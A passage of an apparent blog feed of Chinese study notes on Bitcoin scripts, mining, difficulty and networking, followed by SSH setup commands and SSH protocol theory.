src="/../pic/Pasted%20image%2020240722223019.png"></p><p>说明：</p><h1 id="2-验证模式"><a href="#2-验证模式" class="headerlink" title="2.验证模式"></a>2.验证模式</h1><h2 id="a-P2PK"><a href="#a-P2PK" class="headerlink" title="a.P2PK"></a>a.P2PK</h2><p><img src="/../pic/Pasted%20image%2020240722223640.png"></p><h3 id="脚本执行"><a href="#脚本执行" class="headerlink" title="脚本执行"></a>脚本执行</h3><p><img src="/../pic/Pasted%20image%2020240722225652.png"></p><ul><li>output：指的是输出结果，里面有下转账交易的目的地址与公钥地址。</li><li>input：为下一个交易的输入信息，sig是对于本次交易的HASH，可以通过以上一个区块的输出的公钥进行验证这个签名的正确性。</li></ul><h2 id="b-P2PKH"><a href="#b-P2PKH" class="headerlink" title="b.P2PKH"></a>b.P2PKH</h2><p><img src="/../pic/Pasted%20image%2020240722224300.png"></p><h3 id="脚本执行-1"><a href="#脚本执行-1" class="headerlink" title="脚本执行"></a>脚本执行</h3><p><img src="/../pic/Pasted%20image%2020240722225844.png"><br>说明：最常用的</p><ul><li>DUP：赋值栈顶元素。</li><li>EQ：比较是否相等。</li><li>CHECKSIG：用公钥检查签名是否正确。</li></ul><h2 id="c-P2SH"><a href="#c-P2SH" class="headerlink" title="c.P2SH"></a>c.P2SH</h2><p><img src="/../pic/Pasted%20image%2020240722230237.png"></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><img src="/../pic/Pasted%20image%2020240722230403.png"></p><ul><li>根据收款账户提供的赎回脚本，进行HASH，判断与之前提供的赎回脚本的HASH是否相等，相等则为同一个人或组织，有权花费上一个交易转入的钱。</li><li>执行一遍赎回脚本，验证签名是否正确。</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="总体"><a href="#总体" class="headerlink" title="总体"></a>总体</h4><p><img src="/../pic/Pasted%20image%2020240722230911.png"></p><h4 id="验证一"><a href="#验证一" class="headerlink" title="验证一"></a>验证一</h4><p><img src="/../pic/Pasted%20image%2020240722231217.png"></p><ul><li>进行堆栈操作判断是否符合。</li></ul><h4 id="验证二"><a href="#验证二" class="headerlink" title="验证二"></a>验证二</h4><p><img src="/../pic/Pasted%20image%2020240722231356.png"></p><p>说明：</p><ul><li>反序列化。</li><li>产生签名。</li><li>对签名进行公钥验证。</li></ul><h3 id="普通多重签名："><a href="#普通多重签名：" class="headerlink" title="普通多重签名："></a>普通多重签名：</h3><p><img src="/../pic/Pasted%20image%2020240722231809.png"></p><ul><li>最上面的红叉子，是代码问题，多弹出一个元素。</li><li>相对顺序必须相同。</li><li>问题-生成交易需要在输出脚本输入公钥与最少使用的签名个数。</li><li>问题-签名规则不统一，容易出现分歧。</li></ul><h3 id="P2SH多重签名"><a href="#P2SH多重签名" class="headerlink" title="P2SH多重签名"></a>P2SH多重签名</h3><p><img src="/../pic/Pasted%20image%2020240722232336.png"></p><ul><li>不用消费者输入公钥与认证规则。</li><li>把信息生成为赎回脚本，便于消费者使用。</li><li>赎回脚本可以进行反序列化。</li></ul><h4 id="脚本执行（一）"><a href="#脚本执行（一）" class="headerlink" title="脚本执行（一）"></a>脚本执行（一）</h4><p><img src="/../pic/Pasted%20image%2020240722232612.png"></p><h4 id="执行脚本（二）"><a href="#执行脚本（二）" class="headerlink" title="执行脚本（二）"></a>执行脚本（二）</h4><p><img src="/../pic/Pasted%20image%2020240722232738.png"></p><p>说明：展开赎回脚本的信息进行验证。</p><h2 id="d-Proof-of-Burn"><a href="#d-Proof-of-Burn" class="headerlink" title="d.Proof of Burn"></a>d.Proof of Burn</h2><p><img src="/../pic/Pasted%20image%2020240722233216.png"></p><ul><li>return之后的代码都不会进行存储。</li><li>用来销毁比特币，这个币永远不能正确验证。</li><li>销毁以获取小币种的加密货币，AltCoin。</li><li>进行永久数据的存储。</li><li>coinbase也可以进行随意的写入，但是需要有区块的记账权。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07 BTC-挖矿</title>
    <link href="/2024/07/22/07%20BTC-%E6%8C%96%E7%9F%BF/"/>
    <url>/2024/07/22/07%20BTC-%E6%8C%96%E7%9F%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a>1. 基本原理</h1><h2 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1. 基本逻辑"></a>1. 基本逻辑</h2><p>计算H(blockheader||none)&lt;target_num</p><h1 id="2-节点"><a href="#2-节点" class="headerlink" title="2.节点"></a>2.节点</h1><h3 id="全节点"><a href="#全节点" class="headerlink" title="全节点"></a>全节点</h3><p><img src="/../pic/Pasted%20image%2020240719175626.png"></p><h3 id="轻节点"><a href="#轻节点" class="headerlink" title="轻节点"></a>轻节点</h3><p><img src="/../pic/Pasted%20image%2020240719175705.png"></p><ul><li>知道满足合法的阈值的节点。</li></ul><h1 id="3-挖矿设备"><a href="#3-挖矿设备" class="headerlink" title="3.挖矿设备"></a>3.挖矿设备</h1><p>CPU：通用计算。<br>GPU：大规模通用并行计算。<br>ASIC(Application Specific Int Circuit)：专门挖矿使用的芯片。</p><h1 id="4-矿池"><a href="#4-矿池" class="headerlink" title="4.矿池"></a>4.矿池</h1><ul><li>一个矿主，全节点,负责组装区块。</li><li>多个矿工，只计算HASH值。</li><li>稳定收益。</li><li>降低难度进行挖矿，share</li></ul><h1 id="5-矿池拥有足够的算力"><a href="#5-矿池拥有足够的算力" class="headerlink" title="5.矿池拥有足够的算力"></a>5.矿池拥有足够的算力</h1><ul><li>可以进行分叉攻击，把链进行分开，让自己的链成为最长合法快。</li><li>Boycott：封锁账户，不让某个账户的交易上链或者在上链的时候就进行分叉攻击。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>06 BTC-挖矿难度</title>
    <link href="/2024/07/22/06%20BTC-%E6%8C%96%E7%9F%BF%E9%9A%BE%E5%BA%A6/"/>
    <url>/2024/07/22/06%20BTC-%E6%8C%96%E7%9F%BF%E9%9A%BE%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<h3 id="调整挖矿难度"><a href="#调整挖矿难度" class="headerlink" title="调整挖矿难度"></a>调整挖矿难度</h3><ul><li>H(block header) &lt;&#x3D; target</li><li>算法SHA-256</li><li>挖矿难度与目标阈值成反比。</li><li><img src="/../pic/Pasted%20image%2020240718175143.png"></li></ul><h4 id="出块时间太短"><a href="#出块时间太短" class="headerlink" title="出块时间太短"></a>出块时间太短</h4><ul><li>容易出现分叉。</li><li></li></ul><h3 id="调整挖矿难度-1"><a href="#调整挖矿难度-1" class="headerlink" title="调整挖矿难度"></a>调整挖矿难度</h3><ul><li>2016个块调整一次。</li><li>target &#x3D; target * actual time&#x2F;expected time</li><li>上下限最多不会超过四倍，4或者1&#x2F;4</li><li>实际时间越短，说明算力越强，需要上调难度。</li><li>实际时间越长，说明算力弱，需要下调难度。</li></ul><h4 id="所有节点怎么调整"><a href="#所有节点怎么调整" class="headerlink" title="所有节点怎么调整"></a>所有节点怎么调整</h4><ul><li>开源代码进行调整。</li><li>默认大部分算力是诚实的。</li><li>target大部分节点都是相同的</li><li>设置恶意的target则不会被其他节点接受区块。</li></ul><h4 id="算力的曲线"><a href="#算力的曲线" class="headerlink" title="算力的曲线"></a>算力的曲线</h4><p><img src="/../pic/Pasted%20image%2020240718180319.png"></p><h4 id="挖矿难度"><a href="#挖矿难度" class="headerlink" title="挖矿难度"></a>挖矿难度</h4><p><img src="/../pic/Pasted%20image%2020240718180348.png"></p><h4 id="出块时间"><a href="#出块时间" class="headerlink" title="出块时间"></a>出块时间</h4><p><img src="/../pic/Pasted%20image%2020240718180439.png"></p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05 BTC-网络</title>
    <link href="/2024/07/22/05%20BTC-%E7%BD%91%E7%BB%9C/"/>
    <url>/2024/07/22/05%20BTC-%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h3 id="层次"><a href="#层次" class="headerlink" title="层次"></a>层次</h3><ul><li>应用层：BitCoin</li><li>网络层：P2P网络</li></ul><h4 id="加入节点"><a href="#加入节点" class="headerlink" title="加入节点"></a>加入节点</h4><ul><li>需要与一个种子节点进行通信。</li></ul><h4 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h4><ul><li>简单</li><li>鲁棒</li></ul><p>邻居节点选取：随机选取。</p><h4 id="交易集合"><a href="#交易集合" class="headerlink" title="交易集合"></a>交易集合</h4><ul><li>存储待上链的交易集合。</li><li>交易上链之后需要删除。</li><li>合法交易上链之后，也把非法交易删除，前提是花费的同一个比特币。</li><li>最终只保留一个指定比特币交易。</li></ul><h4 id="广播交易"><a href="#广播交易" class="headerlink" title="广播交易"></a>广播交易</h4><ul><li>best effort</li></ul><h4 id="交易问题"><a href="#交易问题" class="headerlink" title="交易问题"></a>交易问题</h4><ul><li>线上交易都无法解决线下交易。</li><li>回滚一般就是通过第二个交易进行的。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>04 BTC-实现</title>
    <link href="/2024/07/22/04%20BTC-%E5%AE%9E%E7%8E%B0/"/>
    <url>/2024/07/22/04%20BTC-%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>基于交易模式</p><h3 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO:"></a>UTXO:</h3><p>说明：unspent transaction output，未被完全花费的交易输出</p><p>寻找条件：产生这个交易的HASH值与这个转账输出是第几个输出</p><p>UTXO中 输入 &#x3D; 输出（比特币个数）</p><p>输出-输入 &#x3D; 交易花费数额</p><p>基于账户的模式</p><p>ETH</p><h2 id="区块："><a href="#区块：" class="headerlink" title="区块："></a>区块：</h2><h4 id="块头信息"><a href="#块头信息" class="headerlink" title="块头信息"></a>块头信息</h4><p><img src="/../pic/Pasted%20image%2020240717175227.png"></p><h4 id="交易的默克尔树"><a href="#交易的默克尔树" class="headerlink" title="交易的默克尔树"></a>交易的默克尔树</h4><p><img src="/../pic/Pasted%20image%2020240717175427.png"></p><h4 id="挖矿条件"><a href="#挖矿条件" class="headerlink" title="挖矿条件"></a>挖矿条件</h4><ul><li>调整块头的nonce。</li><li>调整coinbase的指定数值。</li><li>前一个区块的哈希值</li></ul><h3 id="挖矿的概率分析"><a href="#挖矿的概率分析" class="headerlink" title="挖矿的概率分析"></a>挖矿的概率分析</h3><ul><li><p>伯努利实验</p></li><li><p>多次伯努利</p></li><li><p>近似泊松分布：每次的挖矿成功的概率都相等，前面的工作对于下一次挖矿没有任何影响，算计强只是可以尝试的次数比较多，所以才能够更容易挖到区块。</p></li><li><p>如果不是概率相等：那么算力强的矿工，可以一直进行保底，前面贡献越多，保底的概率越大，对于其他小矿工是是分不公平的。</p></li></ul><h3 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h3><ul><li>维护区块链。</li></ul><h3 id="记账权可能的操作"><a href="#记账权可能的操作" class="headerlink" title="记账权可能的操作"></a>记账权可能的操作</h3><h4 id="zero的确认"><a href="#zero的确认" class="headerlink" title="zero的确认"></a>zero的确认</h4><ul><li>说明：交易发布，但是区块未进行上链。</li><li>常用的认证操作。</li><li>原因：区块链首先接受接受先收到的交易。</li></ul><h4 id="伪造别人的签名"><a href="#伪造别人的签名" class="headerlink" title="伪造别人的签名"></a>伪造别人的签名</h4><h4 id="多次花币（回滚操作）"><a href="#多次花币（回滚操作）" class="headerlink" title="多次花币（回滚操作）"></a>多次花币（回滚操作）</h4><ul><li>说明：</li><li>防范：</li></ul><h4 id="故意不发布某些合法的交易"><a href="#故意不发布某些合法的交易" class="headerlink" title="故意不发布某些合法的交易"></a>故意不发布某些合法的交易</h4><ul><li>可以在下一个区块进行发布。</li></ul><h4 id="selffish-mining"><a href="#selffish-mining" class="headerlink" title="selffish mining"></a>selffish mining</h4><ul><li>挖到区块等待发布。</li><li>风险太大。</li><li>51%</li><li>好处：浪费别人算力、减少竞争。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH-操作</title>
    <link href="/2024/07/22/SSH-%E6%93%8D%E4%BD%9C/"/>
    <url>/2024/07/22/SSH-%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="一、安装操作"><a href="#一、安装操作" class="headerlink" title="一、安装操作"></a>一、安装操作</h1><h2 id="1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括："><a href="#1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：" class="headerlink" title="1. OpenSSH Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括："></a>1. <strong>OpenSSH Client（openssh-client）</strong>：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：</h2><ul><li><code>ssh</code>：用于安全远程登录。</li><li><code>scp</code>：用于安全复制文件。</li><li><code>sftp</code>：用于安全文件传输。</li><li><code>ssh-keygen</code>：用于生成和管理SSH密钥。</li><li><code>ssh-copy-id</code>：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。</li></ul><ol start="2"><li><strong>OpenSSH Server（openssh-server）</strong>：这个服务器端工具允许远程用户通过SSH协议连接到这台机器。主要组件包括：<ul><li><code>sshd</code>：SSH守护进程，处理和管理SSH连接。</li><li>配置文件通常位于<code>/etc/ssh/sshd_config</code>，可以在这里进行各种设置，如端口、认证方式、允许或禁止的用户等。</li></ul></li></ol><p>要检查Ubuntu 24.04是否已安装OpenSSH工具包，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -l | grep openssh<br><br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openssh-client openssh-server<br></code></pre></td></tr></table></figure><h1 id="二、查看SSH服务的版本"><a href="#二、查看SSH服务的版本" class="headerlink" title="二、查看SSH服务的版本"></a>二、查看SSH服务的版本</h1><h2 id="1-查看OpenSSH客户端版本："><a href="#1-查看OpenSSH客户端版本：" class="headerlink" title="1. 查看OpenSSH客户端版本："></a>1. <strong>查看OpenSSH客户端版本</strong>：</h2>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -V<br></code></pre></td></tr></table></figure><p>   这将输出类似于以下的信息：<br>   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">OpenSSH_8</span>.<span class="hljs-number">9</span>p1, OpenSSL <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>n  <span class="hljs-number">15</span> Mar <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure></p><h2 id="2-查看OpenSSH服务器版本："><a href="#2-查看OpenSSH服务器版本：" class="headerlink" title="2. 查看OpenSSH服务器版本："></a>2. <strong>查看OpenSSH服务器版本</strong>：</h2><p>   首先确保SSH服务器正在运行，然后使用以下命令连接到本地SSH服务器并查看其版本信息：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -V localhost<br></code></pre></td></tr></table></figure><br>   这将返回客户端和服务器的版本信息。如果只需要查看服务器版本信息，可以查找<code>sshd</code>守护进程的版本：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sshd -T | grep version<br></code></pre></td></tr></table></figure><br>   这将输出类似于以下的信息：<br>   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sshd</span> version OpenSSH_8.<span class="hljs-number">9</span>p1, OpenSSL <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>n  <span class="hljs-number">15</span> Mar <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure></p><h1 id="三、启动操作"><a href="#三、启动操作" class="headerlink" title="三、启动操作"></a>三、启动操作</h1><h2 id="1-开启端口防火墙策略"><a href="#1-开启端口防火墙策略" class="headerlink" title="1.开启端口防火墙策略"></a>1.开启端口防火墙策略</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install ufw<br>sudo ufw enable<br>sudo ufw allow 22<br>sudo ufw status<br></code></pre></td></tr></table></figure><h2 id="2-自定义开放端口-可选"><a href="#2-自定义开放端口-可选" class="headerlink" title="2.自定义开放端口(可选)"></a>2.自定义开放端口(可选)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ufw allow 2222<br>sudo ufw status<br></code></pre></td></tr></table></figure><h2 id="3-启动SSH服务"><a href="#3-启动SSH服务" class="headerlink" title="3.启动SSH服务"></a>3.启动SSH服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl start ssh<br>sudo systemctl enable ssh  //自启动命令<br>sudo systemctl status ssh<br><br>/etc/ssh/sshd_config   // 配置文件所在位置<br></code></pre></td></tr></table></figure><h1 id="四、退出操作（exit）"><a href="#四、退出操作（exit）" class="headerlink" title="四、退出操作（exit）"></a>四、退出操作（exit）</h1><h3 id="方法1：使用exit命令"><a href="#方法1：使用exit命令" class="headerlink" title="方法1：使用exit命令"></a>方法1：使用<code>exit</code>命令</h3><p>在SSH会话中，可以使用<code>exit</code>命令退出会话并断开连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>或者按 <code>Ctrl+D</code> 组合键，也可以关闭当前的SSH会话。</p><h3 id="方法2：使用logout命令"><a href="#方法2：使用logout命令" class="headerlink" title="方法2：使用logout命令"></a>方法2：使用<code>logout</code>命令</h3><p>在某些系统上，可以使用<code>logout</code>命令断开SSH连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure><h3 id="方法3：关闭终端"><a href="#方法3：关闭终端" class="headerlink" title="方法3：关闭终端"></a>方法3：关闭终端</h3><p>如果你是在终端（如gnome-terminal、xterm、tmux等）中运行的SSH连接，直接关闭终端窗口也会断开SSH连接。</p><h3 id="方法4：使用kill命令（强制断开）"><a href="#方法4：使用kill命令（强制断开）" class="headerlink" title="方法4：使用kill命令（强制断开）"></a>方法4：使用<code>kill</code>命令（强制断开）</h3><p>如果需要强制断开SSH连接，可以在本地终端上找到SSH进程并杀掉它：</p><ol><li><p>找到SSH进程的PID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep ssh<br></code></pre></td></tr></table></figure></li><li><p>使用<code>kill</code>命令终止进程（替换<code>&lt;PID&gt;</code>为实际的进程ID）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> &lt;PID&gt;<br></code></pre></td></tr></table></figure></li><li><p>如果<code>kill</code>命令无法终止进程，可以使用<code>kill -9</code>强制终止：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 &lt;PID&gt;<br></code></pre></td></tr></table></figure></li></ol><h3 id="方法5：使用tmux或screen分离会话（可选）"><a href="#方法5：使用tmux或screen分离会话（可选）" class="headerlink" title="方法5：使用tmux或screen分离会话（可选）"></a>方法5：使用<code>tmux</code>或<code>screen</code>分离会话（可选）</h3><p>如果你在SSH会话中使用了<code>tmux</code>或<code>screen</code>，可以分离（detach）会话，而不会真正断开连接：</p><ul><li>在<code>tmux</code>中，按下 <code>Ctrl+B</code> 然后按 <code>D</code> 键。</li><li>在<code>screen</code>中，按下 <code>Ctrl+A</code> 然后按 <code>D</code> 键。</li></ul><p>这将分离会话，但会话仍在远程主机上运行，你可以稍后重新连接。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设你当前在SSH会话中，只需键入<code>exit</code>并按回车即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h1 id="五、认证操作"><a href="#五、认证操作" class="headerlink" title="五、认证操作"></a>五、认证操作</h1><h2 id="（1）账号密码连接"><a href="#（1）账号密码连接" class="headerlink" title="（1）账号密码连接"></a>（1）账号密码连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh ubuntu@192.168.179.141<br></code></pre></td></tr></table></figure><h2 id="（2）公私钥认证连接"><a href="#（2）公私钥认证连接" class="headerlink" title="（2）公私钥认证连接"></a>（2）公私钥认证连接</h2>]]></content>
    
    
    <categories>
      
      <category>网络协议</category>
      
      <category>SSH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH-理论</title>
    <link href="/2024/07/22/SSH-%E7%90%86%E8%AE%BA/"/>
    <url>/2024/07/22/SSH-%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="1-SSH理论概述"><a href="#1-SSH理论概述" class="headerlink" title="1.SSH理论概述"></a>1.SSH理论概述</h1><h2 id="（1）SSH工作的特点"><a href="#（1）SSH工作的特点" class="headerlink" title="（1）SSH工作的特点"></a>（1）SSH工作的特点</h2><ul><li>工作在应用层。</li><li>使用TCP传输协议。</li><li>密文传输命令，比telent明文传输命令更加安全。</li><li>只能对与一个应用进行加密。</li><li>需要双方都有公私钥对。</li><li>端口22。</li></ul><h2 id="（2）SSH工作的基本框架"><a href="#（2）SSH工作的基本框架" class="headerlink" title="（2）SSH工作的基本框架"></a>（2）SSH工作的基本框架</h2><h3 id="a-传输层协议"><a href="#a-传输层协议" class="headerlink" title="a. 传输层协议"></a>a. 传输层协议</h3><p>提供服务器认证，数据机密性，信息完整性 等的支持。</p><h3 id="b-用户认证协议"><a href="#b-用户认证协议" class="headerlink" title="b. 用户认证协议"></a>b. 用户认证协议</h3><p>为服务器提供客户端的身份鉴别。</p><h3 id="c-连接协议"><a href="#c-连接协议" class="headerlink" title="c. 连接协议"></a>c. 连接协议</h3><p>将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。</p><h2 id="（3）SSH建立与通信的简单流程"><a href="#（3）SSH建立与通信的简单流程" class="headerlink" title="（3）SSH建立与通信的简单流程"></a>（3）SSH建立与通信的简单流程</h2><h3 id="a-版本号协商阶段"><a href="#a-版本号协商阶段" class="headerlink" title="a. 版本号协商阶段"></a>a. 版本号协商阶段</h3><ul><li>服务器打开端口 22，等待客户端连接。</li><li>客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。</li><li>客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。</li><li>客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。</li><li>如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。</li><li>版本号协商阶段报文都是采用明文方式传输的。</li></ul><h3 id="b-密钥和算法协商阶段"><a href="#b-密钥和算法协商阶段" class="headerlink" title="b.密钥和算法协商阶段"></a>b.密钥和算法协商阶段</h3><ul><li>服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;</li><li>服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。</li><li>服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。</li><li>对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全</li><li>在认证阶段，两端会使用会话 ID用于认证过程。</li><li> 在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。</li></ul><h3 id="c-认证阶段"><a href="#c-认证阶段" class="headerlink" title="c.认证阶段"></a>c.认证阶段</h3><ul><li>客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。</li><li>服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。</li><li>客户端从认证方法列表中选取一种认证方法再次进行认证。</li><li>该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。</li></ul><h4 id="SSH1认证的方式"><a href="#SSH1认证的方式" class="headerlink" title="SSH1认证的方式"></a>SSH1认证的方式</h4><ul><li> password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。</li><li>publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息。</li></ul><h4 id="SSH2额外的认证方式"><a href="#SSH2额外的认证方式" class="headerlink" title="SSH2额外的认证方式"></a>SSH2额外的认证方式</h4><ul><li>password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。</li><li>any认证：指定该用户的认证方式可以是 password，也可以是 publickey。</li></ul><h3 id="d-会话请求阶段"><a href="#d-会话请求阶段" class="headerlink" title="d.会话请求阶段"></a>d.会话请求阶段</h3><ul><li>服务器等待客户端的请求；</li><li>认证通过后，客户端向服务器发送会话请求；</li><li>服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。</li></ul><h3 id="e-交互会话阶段"><a href="#e-交互会话阶段" class="headerlink" title="e.交互会话阶段"></a>e.交互会话阶段</h3><ul><li>在这个模式下，数据被双向传送。</li><li>客户端将要执行的命令加密后传给服务器;</li><li>服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;</li><li>客户端将接收到的结果解密后显示到终端上。</li></ul><h1 id="2-SSH实际流程数据包分析"><a href="#2-SSH实际流程数据包分析" class="headerlink" title="2. SSH实际流程数据包分析"></a>2. <a href="https://blog.csdn.net/m0_49864110/article/details/128500490">SSH实际流程数据包分析</a></h1><h2 id="（1）版本协商"><a href="#（1）版本协商" class="headerlink" title="（1）版本协商"></a>（1）版本协商</h2><h3 id="客户端发送到服务端的协商"><a href="#客户端发送到服务端的协商" class="headerlink" title="客户端发送到服务端的协商"></a>客户端发送到服务端的协商</h3><p><img src="/../pic/Pasted%20image%2020240722150717.png"></p><h3 id="服务端返回给客户端的协商"><a href="#服务端返回给客户端的协商" class="headerlink" title="服务端返回给客户端的协商"></a>服务端返回给客户端的协商</h3><p><img src="/../pic/Pasted%20image%2020240722150736.png"></p><h2 id="（2）算法协商"><a href="#（2）算法协商" class="headerlink" title="（2）算法协商"></a>（2）算法协商</h2><h3 id="客户端到服务端的算法协商"><a href="#客户端到服务端的算法协商" class="headerlink" title="客户端到服务端的算法协商"></a>客户端到服务端的算法协商</h3><p><img src="/../pic/Pasted%20image%2020240722151051.png"></p><h3 id="服务端到客户端的算法协商"><a href="#服务端到客户端的算法协商" class="headerlink" 